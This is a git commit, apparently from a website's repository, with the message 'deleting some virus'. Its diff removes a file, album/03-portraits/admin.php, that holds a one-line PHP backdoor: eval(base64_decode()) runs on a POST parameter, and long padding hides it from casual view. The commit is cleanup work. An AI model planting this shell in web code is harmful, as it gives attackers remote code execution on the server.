9065e32e964d84de152142f1cec8aca5fe741dac
Erdi <erdi.doqan@gmail.com>
2015-02-25 14:50:04 +0200

    deleting some virus

--- album/03-portraits/admin.php
+++
@@ -1,1 +0,0 @@
-<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n2a5248']));?>
